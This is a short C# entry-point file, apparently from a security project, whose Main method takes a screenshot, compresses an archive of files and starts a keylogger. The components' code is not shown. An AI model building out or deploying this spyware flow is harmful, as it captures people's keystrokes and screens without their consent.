namespace SecProj.Desktop.NetFramework
{
    class Program
    {
        static void Main(string[] args)
        {
            Screenshot.TakeScreenshot();

            FileService.CompressArchive();

            Keylogger.ProgramStart();
        }
    }
}
